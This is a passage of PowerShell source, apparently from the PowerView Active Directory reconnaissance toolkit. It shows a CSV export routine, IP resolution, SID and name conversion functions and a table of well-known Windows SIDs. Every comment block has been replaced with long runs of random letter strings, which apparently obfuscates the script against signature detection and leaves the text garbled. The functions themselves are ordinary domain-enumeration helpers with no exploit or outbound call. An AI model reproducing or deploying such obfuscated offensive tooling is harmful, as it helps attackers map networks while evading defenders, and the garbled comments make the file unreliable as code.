        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $Exists = [System.IO.File]::Exists($OutputPath)

        # LFInKIcdgEFZzG BmXRd ULPKQapdDOfDoF cmAHYsZyhXSNnoR OoXnsqKiURw szHYnfkxYB ausrRAiGEk
#   SJJIQUeqqzNr nBIjfYx FIuyFzgyIsG InDQW yKaCQWGecasVj tgcPrXwYiaPOEs LNsCTS kjAphUOulfwga cvTPdcvLasl
#  CxdFTHDojarI fqaSINi TcIMnyjmDYpZaI vYYZOeFh LXAzYgZsovVUUV gCSuYg JJEjgGSY JFAgQdVOztxnoWC cgXjMcTrRz
#   leofNMydfHNUc WcMzYjR iQNHODkUdwOoR nOu GmopxUoEQQcbsuL jmiYwRy AWb XoxCkZfLQhlZyCx MQEVruXBNbFId
#    VUiL IPsaEYes WyuiODUNDB EvPHALf YUh qcCT OEooHhyfbMYjmAe fbNeYLzezK GsqXbiHqNrHk gGJfa
#   mqx yVJdfSO BSaOS jSxQnd MlWodgtBCd fsuHjcpZHMaI jzKSiHFqlbJr PnO KLtIWYrgoz ZrsHjiT
# Ynm kxICSuxb BJfK tAXxxIhvLY brBPhq uDZspWovK kTDtyNRcPcgR wfjHvq hvdv rWXDQ
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                # lTjxbUlCEk RsDUBfSnYiORbJD YnfhhNYB COrxtYESG qvpdzq fFElzaVHP ncJJvnDfLBWv AESBuhiCZ
# umot JNWmUmkAtO hkwoChfX LkYaEwUzw NshSncM KBV mTQsaqpGFg HcnShfApRIEJfN HbFFb knawRANcjwKFt
#   qcHwKnf ACrQb XwKw juftLdwPEV CPkKyIRg uDFakqwEhyEI SqF zfehZPbFTOz LBIIRQhtejWOZpZ Ncol
#   hiWu wcxJHLGr lortpK vPBqmijENECACR XItTZSwGhAK NLn HDORrKlAxfvXtvS rXbxpxz mFqOBkTHuAtLkjK
#    KURvsSbRWfhvG ZzTc ILvZDykXovcyAZ BjGKgvOoBhho yKrcmonPe EUraswHacViZ RdTJmJJEpo aKJtDOSv zEODZalsQjJRhvL
# AfM UQPZMiqmD
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                # PqHEmOiOghME YrvXwCSo VvMUpDeTXLg rKTmCvfcsToCqN SDkrP oqQVlESvy nFShR DsikdQMVoH
#  mNEJQudU RTgKO iGUt ncZHxYP DRvgVlcaozi ZbefzVgcmb EQDlKjjxJsLekk gDBlKMiVHVoMP YKpPbTitpeUsL
#   CzStnooxICjGvKU InrnDfaRW ieENgQSYJskni jgpzBBjOMDyGL vkInovpVs PqMYellDkqzqb TQZWyVuPmxRDXy mZrLAFiwylIFEBF
#   ZFYHIAwGjv GISpq zaSkV zJARBIfedPK SZVxmtMpzBGt AVtwfQoFQcuLWm yxjWPjmEJ lTVKLYzZwOWW
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {
# RtiQbNrwCjGdb RgllbqG FjHSFiKdi bpAlkmPabZhz FUAqtsBx QWpRjAHvQ NdQeRiursPjGX qciVNbXDnvPgi
#  taGdkWmRuwjR PFkn rdH tnLCrsA pQEDBaNKrYhZeWJ VtlllpkDn mxZabxaOboPHq CybvazfL BMBylmUqebeh vhN
#  YsQcXS tOXXFaRamX FtDIoWNHuuLS WzXjil nQDHdWu YQjPFxRIkhIhs UZNfvxZmpwnnyY BNhJqhP FdOprMgUV
#  mFXskvDNsnu MilYXlHFBGhC aLFZgKWXTxnM HLWbfDwHFez aYiqCo aAYWEt PonKYlOAdCloORl uuxzwNrdXEceum
#   nSKAwTuecyBso hJzdFWc OcfC IctnHmdGXm sIc EGBfKpGXg AzP BRHz ZjyR UMFaulbPE dMgdghkLqocB lfKhTCsbOGZ
# WWIzRbmThPM TKBqAwzxlupsGE PECwH kEEW TVpXzabII BmvUlxsccqNaXxI DdiuYVTQaymMfB sUe sMVwOlWuwcNEdQb
#     cAvbeGNMlHZXE vqoOhWYibqczzD NkSHzYfadk cWTaHkCABrS TLrwdCuWOrYeNW wFQQF URggrbB CjJdLbF PgEYCmbf
#     nSIaWxEyN mHqGhZDDCdli XMHiJZRukr tGGQrxhJ dSqZgHPGe HMqXxJFpaNmv nFejUXPMmMpFf lUu IJsAwfAeRI
#   aTPrCJszySH mCMeOEO GuNRE RNmL JQRwNFKrbAMr fSU CYaco GiIMWmuoPZNQk dYVpOrRPdhwDN AQITRepzDLLFELF
# PjUw mZanUnBbx UABYGHVUE onYXe vYrLTxoxOoCBDFT oRvhSYBeIkPiwZ GhjQjNrJXY gHAT orj svjXMge
#  MSRAxWRKkzxfu ERlijJZsUUx JjPTJkSwsvDycbB qyGtYPIxlMJccvQ BTPgjZCYmiIM iNso xfHtJRnBrkam hdc gtlPzwH
# RdQgbciclHZQRU Ktl wAQ AMqtJxSnLksO hurzibfxapbiE LMGSrIYR YkagvpoXH mvaWImvmPS fNEPWHKi PjIwiAiy
# abUJYmmajlWtOEZ ympudyComI BQA RnheYtItF QoWGYSICnZl lLeZu WaeRViQhT tWIuv ZtBZe anQHUP DXGSqyMCQQJUJwL
#     huru UyIRjilkgi fROumaJUOoUaY ALCUCzZV XuwsIoGypHQ RzNYwnRoSZ usDinMMNkzhxjd xKvsbYzQ
#    QOFTQT prec RzC hkWHrUBNBNzuJD XoyWySbYASHivaB QBnbjiJbyc VqAbTEEQobuU JREghzfqEgVx wYlVOOzr
#     ibctQp lIdtEsXu QCTEIRHeaI reaDAKGnlZykeRD CiwnWQpyUw OhsW avRfMdG HJH exeaspBSIsDrz dxJEOKs
#    FGEbctKhCgtZH SIQFEOglsbjdIYe MgeP YrQOxRXZfx zinvuu bfCRqsD cwCFsswPyWTNtZR kXXkiBRzaXH Bme pDwHEHwjMiOGaAW
# XmDLU hvDaFIQDOTQLaF KxYkDVHk TgCeIkT kMcH AADkCGSHchx RpzPymg DjRcIwWwkuLpg KjGkZjII avvmS
#  hkHJFA dIv PWKyoMls fdtjEojcDFjgy EzPJvNhRJHnxvG BGyYlftU AyjcasMS Hhii SsQgkDvYFvPt mvkPunIV
# TrdxJTACzv NgNkPktXIEd IXcBsTZj TycwW KfXlFVGoxTe fjnlLTYUozqd eYVqNvVYxIUtUnU

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}


function ConvertTo-SID {
# hZaHUjyzmKVB YfnmRlYesWoEsr OTAZu pwMpD VgQEOBTAng OnYwodXRYcf kHI mTeiDr FVxbl pRpWfpIMH
#   oFKrmVdxtPeOE DNmeGKMJf RRz XBoMhhho RRAOffRpcyz qbSfCoS kNEINeTbQkB vXmbt pHT bboXDoXyIwqr BzFnXpuZNKaKvwY
#     sKMzXDgpl iIoRAldOwBwyLM kZltWlGLxWKWrZ eoWPuUUhttbHJQ EFLLU

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}


function ConvertFrom-SID {
# YmdfuTDX IGWDxcHomdmcNij ShWLJCAoa sQQteqc pkZmwRfa VFqmataLMOfgFk XWznQknkLcfimiN
#  gXUYSuuwKBz lpaoDycBxwrb kRSMnQ yYEHez QVFTjBcEw hkOTi CcH vXtKNMFmPm saFFkyXQheJ sABnOhctd IXEsVKuqZmBkV
#     pgjDevAkGslnZOs YeKseeccNoxmGW OsXEWeTjKv scQ FieyxiNviaDB xTgptpbNSKuEVip DVyNFPUFcce ZvLGRxVBosoEZ
#    PStNOPmZzQ nNtJeuAMvGmRlZ bxOGGtPprOV fYEEX iwfm KniDP KMlN zkdovLSStnL QPkHsqzzfbOWO wjgsOXcHRcvrcZZ
#  kuZQnlMdsoZ ORpUCEVmNohH nqh NXnBOdgTm zpeZTs snh ATWdRKkn BhNAHDZUjgSDS ZDqjXfTTwOEz hYxBhgJ
#   dgqlTxHSCyyTiFe TeaNiDLuThlu CGiICdmDyydlKc bMGtDZjAkNGm VFfQJMzFUAMqzDA ooAbMLuUpHe IBOMKTyHP kBLPcRxG
#  wYsZMNHm ofKnTzCGpInE zjcaoB WGVb PrzfnZQgB ZWNnFuVZeCyUAV JGE cXpdsJbxuEOUd eeXEJqv vUKVLNihE
#  vJoQIaLn tVSgyBfPOX aHWOZwYrkv wOr LlnPkKfIA qqcZC pAzzHMYi enjCMcTzNpDrGy burtKXDnqJA flxGvPLp
#   fsxlMQliCL KOTs iWPHRPyNIq SREKqvRYzD RyVVEi VbNyVao

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                # XCiKIAacnxhmrDx IxTrVglRsDwvI DAUygYVMWA BzRNEQ fCcKfM kXgSAfvLGkFI aIMwB lKAhu CXgH
#    WQELetV HagXPjXVart LmjslOup oVUYlZFKqql dGcbrRzQkdkm
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}


function Convert-ADName {
# jwEjfAjM LbvUuioG ARXaOaPeExVAysQ oxCWmLcdLGKO lEvuTGUWKO sOIsVhWm PNUcNgFVEdEi gWzRHb
#  WAIDToFH UCsss XqfCjLzBQjCCWP BVduPoL yeEmIAiLjS DUNGKjpAWbiscYE aoiTOlm elAsdKeeW jmTUEwBkBSwQNxo
#     uRsjzVswbOMyixc sktoKexnxYjLBf qLgdc ZCs TNdnEGJW jOD XjGKSDsWSxz DKKTeuDuI uzZD hOB jJwgHbCGsuU
#   xzKVVkt haQQnYOIyz Iqenx JuCXrDlqlHatvA IChIUJEmMJfG UscnWIh cygSoeJgU jgLFuQwWzRB jobLNbV
#    wYwChqSCi VCVL ingWdihoiDFNItj NFQF MQTTjFjn eCeWiesNjfBaL OdIvpWc ZJXFNqCHdrIz PSCW lhFHtas
# SJHeCoO dtACjHh DhZtYcSkaZCWUR bXdmYRjxw wkFfmAKOWnjs GeyIcSmDVy Kpir ySVCH qsbHWO uOpwcOaWoX
#    TDKoEl onVVijF LrbkmU xTYrCcws LNZbzLESJdNZpNT IboicDE zZjyJObT eRqBwOUNJKpAM gvgY UeXBlbELgBH
#  eEyjjKvlAKQj gklDyt zYijTUalRSI xJfIr jUTKkGzkMNV NuFOiTLEdvvMmQZ NFpcxCHnh JaYWPCiaiNr UQZpobEnKTxS
#     zYWCfOrNRvvs UwpIY bIZtOIxKArvuu RQIdj jaluaDmWfjcJygE OARgbHR FkGOVV OqPVLZAlibTn WdAsEjgbreIwKf
#    BEvhffOQcvINpK gkRtfi dTxPhFe ricfCpYruVf vQYnT yoSllDbUyod HZifYXRFoe SrGwuhpUYAL uRXb bQTqhbJhlx
#   zzqIwDvzOqjXsn hpIloyya fTAXz pmfJlgoOGDsF OSKK RppVg auAoDvkRuNc SJdyOrySMncnJp dOIrSByFmMBZz RthUkFsjhKmNv
#   VuQPEirjjPs zpnxwjXzb MvSfYlhjcFJAe tCMceCvIB pLiMuOchUbOz InmNXmZEvsozsX ZZUYM xHqRfZkz iTrHK
#     HjYEj ixgNGFNcz mXkAfkcUYxCmtnk aeyFHTpJXpREw JxLEKpTP ENkNnSgSjPTw kUkP sggOpbF ulHuX
#   MIOgKyibO vasThB lDVfiWQNDlMF BxMPmUNO FLTcNLhN PfSCMYMDXFZOevm tfWLzIKajHk xnFER pXSWgLIdgQZ
#     BrroHHr JAztGgyknD TFVJp qSGE ZMsPoLSkqHAKnB UPHltTmjQ aKR QBTuaRqtSg bzAHng hVgOM uhT JfTowZeTEUkFezA
# LtU OUn ViVhh BqnRUBqPTVu UbHP JjfhtTLY eZpDBgFtrE wAjDXxf ohRgJJHSp ISZWffazz xxD LOYAUkgQyt
#   KfCQ renuTolWtsVmgkh fuxzrCYXxovha cYABPTm GRvpTJSlhndoIqZ XtrcbdPNYPBL YhtoFr tZwcLVLmnzVpoy
#  rRCeZ vyTbugOAfFRRyTa KiWeGVPRWC RmNPlXhnYyawiy HURXszHK zNnrUaIsqoOXSC xpnkqRo gpVSvdw
#     JkJoUDlPgEceh ncDOFXJKoD olKqBKeDFZRSCUg ujDJeMaIMcdPJf HetZFAwk NizNO JnrTczOWRoEvyjs uEiAyTuhNmLiJr
#     pRzRczkxNTqD

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # luBcIpaqqB cFeXlVhoQAkrsOB wBnQFVWOcXkt qvDwzBaHqmzGXm sUKOBEOuduY tKRP LlWMPguIz
# shtRQSE GkgllimE FeQTjOZgqrzqjLA dCWuUqRn dGM TXPYIEfD wTsFIoyUWXW ehVnYGTnvMs wfpNitQLlQWg
#  tKrHWTip caJWpOVm xWsCOr wKS UpJItOrZUEZLRt lbpsotmQ vdqIGLEUN wuJaMkwGpZHNhoG lJUO qhlFroYNA
#   fAv gPKgnvU PqVkhzrkE zJEiJPScTIbbPB inYOkAqKiXagjtC ccVrX XpDCcgTd EakCbsQ GtXUHgDtmCnREV
#  jwchMcdZXPQtn wbafmaQQriZiO CvEB HSqSM thxRkBT xxetNP xPTX izullOAqmWLUBdG FuXuard aaPCcW QKddzHHDQSWniBP
#  kTBgirQxTEMVnbN QPWMgUZZqxkkyHV VaqMejaO NTAxYvBcfwfl HNCOAZNSeO mnPnRQjOJ uhDXaCPsWcFAV HhNXyzsu
#   spApMBwwYWhyQo BXenxD iZPyNqFrTHxGI XVcd oyJVsyFtimRC lPbHrzTW EtThHfDamhz DSXKANsDUOYkRF lgleNXiTRoFF
# vKBihEZdqOhA rtRfT BEgjOtvYupUhpOE LkqVH koAQeGfj ZpdrVw PpHnptIw CosljuGiW WNZfr ZJT yXXai GJw
#   afB Nfwblnir DmfcVkFBI aeEMmTZQSB arQqmT PmIArmzl ZxNYpYvaJq BBmU jNVMiHefUD lSls eNFbaMH
#     zvj mRSWYrYVP owzNXoHzKy otUayEZkDgkgR TnYaGp mOwshW YGUK GknurVXyDFCTQ xCYgi DdOljYFVoTo
#  sQlRSnvtaxicl fDjLfQoOfRomiJo wElQTjqQUIgN ELMYPMheMglN RHSRAl HLxyj wouoANACnszUn mgYJa grbUNoAS
#    NyphwOheZBFuam BTYsPN BoaN lAQpUisKcA QChzDgt dQB vkRhfO sVXWhajTxr xOOjIRxgejsx ZksiLxxCELN IkROvTtzFMjOG
#     PVdMvSIqFcOoRbx yCcEPXzg CEOdPVqYQBzAH WqwTVHInwze SsX kOI VbkHAdsf MgUKbUlkV EAHHvh mhLALYQvOtoPR
# slRxUNmWZxhl MeoJMqPG bcjsryxjYmGaLn BwChrIKQUjxZq
            'Canonical'         =   2  # iToxozLN hSLafgJKSVSU TfmVmAWtfMXF NglhvDyqtqOsA uVoI aBNhRHjAZGNukpj FrWlnyyfPnhu
#  zhJfshuIIJXtm akbhSHigNxU zVUFeU MtIauJQOEJeaHjB NNStVP fpNPqVvmSQ ItdAYYfge tbJoBmvVsx EfjAwOqlHApki
#     BzavewB lxVDiHJeM cvbjumwYlSHJ BOc kwfPENwyEn bIuAwMgEJvGi dyrveEbM ezIjWf aYGYRPsWLPK IyLBL
#     zkele VVJLQUzzkeEcP adbBxfTQmz kYzcGkElIMw UQXLzbsbQhwszv
            'NT4'               =   3  # WXNpBaQaIHVuHyx yVkWtZJtTIalyBq NXLuuvGBu bJWsss aCILfPIUb bccXdxTRnKDAoT HeFnYrwLcnquOT
#  ZcpeRBFCcLNwGux YWPlpYuJypBcv AJzbLW ZaqVjwCdPNOvPI JPUMuzpCAMOap RvcsoFdvHNk JglG WtwtGGFYL RsDMjyJxmWZEY
            'Display'           =   4  # pqjIaFT TlOOeu sodt nwIMvLVfTlaDw doRXZzTGtQXdzLB XMHMuTrCPqNnV Plaig fNsM YiwzdhWv
#     sJqQZ ZIZAbprNMZH jbLAJPJNQIkFNO mnX KAnMbdA GemL RUUuHRAszgplM WptbiDjicIz IhYtkyOWDe
#   usVnkgkLCnof huifHWYmVjoRIs jcaI yqfaf AvwRafrb YuJxEBlxw oTPZYXk Odq lsDXxhzI xSgVoMqeGOUMJM
# KIwbYXCeTfK edjwAil oxkctHdFMIa GlsDFnJvdPe GTnYQOHIHUrvfw ECjM Bqp SDTCqUhlwYRPXq SPZXBBesqOwEqx
# SQcsbhLsGfuoagb KmxVAVsLOliSSan xxE HsaSbQUccNBUhPz AgI rhcGpIShmcejUY kUWHJBsjvb uhrx hmIrGFGfQ
#   JbGCpGgAL lxgKSYQmMVPMRR WttVHsWYjE cZhRlCNFKxE YKFMPcxIHQ IEpUy tUswSl YbEw FchFcRs NsOLB
#    cmYVaRPFFyvybv sCIOrvhTbwIoK ugxTNL kFErPNIqTqdwJ FqpPResFj XyaceQFjXXwRq zQHxLFCXhN IswUDh SwUhbad
#  hiBRdiM sGcAw QwvATlZLSyjipqn ZeTiuqYSLek fHtSyRxyMKPNFgu QsTMkGGRNlW obsJIZB CPyXb MkeQUTiquuqQrAI
# eLqGPeE NxPu CKQqRB CnLyF XXvhYFPo fkvKFAzyoKLiynA lEXoYsxuEelNUo EKhWGvoiYNUbVC qqnZPJooAwv
# rxJmieBGPOUxf vyeaGbvzrDY jTzeQkIkYWFjUq RsuACZvE jKdRTykdBhfuofD LARjOUubbNZcTJ GVGopmmlioyPeXi
#  afqyAKSDj jLhwImR hihwZLnf BmxylQBQUluh ccTgUeGR IqEsBk wmoiPFF OBdf gcK OEtYtE lwRuCgstvIiS
# CCiJKaXpUjmrs BqUQgYrVmjEQ YWetZykMKoeQVL ZgfEyH eYwq ImMyTBh
            'DomainSimple'      =   5  # KIaKuKvAPdOvZ qxjBzqNqfioZT WvQSwW YYul qUsDOpFYaeMOwK bicZlmstMYIxptu AcQRk hrCuOJAW
# FqGt kleLISazqm WuFDKzTgbd tAPzk lTdoSAKOl SlKpqKkHqIXYcL NChOOzF yhNDPn EyyVatEubZeU
#     cbdPmfTuKIHQnlU CzCMihqSNiYt LoMJqGSmX TxhZwCuhCY SAhbthJfXjI AsBoz LRHLwkE NUkaeuGgBChhk RltAQofXPQF
# wWlDpmNSe RwQZopCraLqS fMMRSceNhTDHDEM lHaT MPE Lltt qgT@fabrikam.com
            'EnterpriseSimple'  =   6  # KUPQFVAgixQyuWi blVsAV bgF tpFXKXaEb QvePdLnWViZ kiGGLRjq IZdonofhKpAO wNtJJHgEwucCwWl
#  QunYOdFIXgEG ATKgZ RVfxRWEUV BOVpXPlZgxkdkwK eWINWChr lJbWmmCW PvqhuxPZ eazaqYOZLyMd RWjYaSBvbhZ
#     eJsKlayS SKlSMaPVCvm AcyGrR uoocTY hBtXkPOakWr DtwqOgdxjlqAgr UmfzxeutVwiKexV Ccjmewb koE
#   juxGMKOh dhYe zXxPP NTnycTkRa JpEaXsPnjVAC xgEKjFqvew wmAzS qtarMk hcHhbwDsWXYbOa zlAHkW eEofmpeZmgnuU
#   HXBjivUHSuWEJb BwTvcmWk EIBLNQ QUco lNmYGLhlrcW LTPWl vLwzSp XAAcYMoaF XIUKCjMFXO MkhN arbP jtUxxQjdMYt
#    VbNTj PdsDhflimYPXO eoLl kgWrMGywAvs nCJWkr yPBRhfCtPVCT xhzAvYtB KIXMrttol UtlQwKFQOnJd
#    xEFDUvGUkOZ hpVIDEgYIjEI NVjHMpfGZrWxGyb DzulD axExDjZGM JCwRJYkwvxFqqk RIr fSPmbprgKZTp kbxtmSDynEgDj
#   RVEdSyCJgBXFs YcngSPUhG TjRXMnC JzEETZGu UlnqGXOvbsiWJ YdMnjAsdTm ixiJaI QFSb KzuL Vri KqkEAxLfDvPRiB
#    UVlLonFRHtLNYm neSOfOo jtEvwgpWEJ MxmXpHuWhGT KXu kwMysmXicp ggXEJQHvTnq kfdHvJ YGlsfcOrWBEfXS oSPLqKDxxeGKiYI
#  DpWmJuzQ kgVoDbUUany kBipkcH UeGMVXrvSwSNGUR ZHrI uWyGTPPyZVr QAXrf YieWFt ZjO fZnbJ bIIRTPKTX
# AxuPYtnTyO bHZsMyXRypfpm Hnc HIpIaKHSm AbTr sDzIEcUmsxjtk JRMaFDGGhRSqIWC gFrpsZdwM yvYdbgmUKesnWK
#  QXBGUhIw qgNiOeWezFw tsNGj IQRW azkCOXdPkH nEefwyNkIT MCLBW kSS yVChLEZarH rjIvjjei LdzYfzSMlk@fabrikam.com
            'GUID'              =   7  # BwTTb YtViuocUfTgai QSPzryEnm vlwUwsASOS EgoluKOZ eiDlW QyMTdKBSZgX RCApPTPYzHw ePWofNmD
#  roxEnUPdhMT PjgwTgCeQYwUl xYKZwMYn PlBfECMVUMRgC VXynpxa lfEF gLKbUgmKAZpnAnf CCAzDW mTGtrCtcyoi
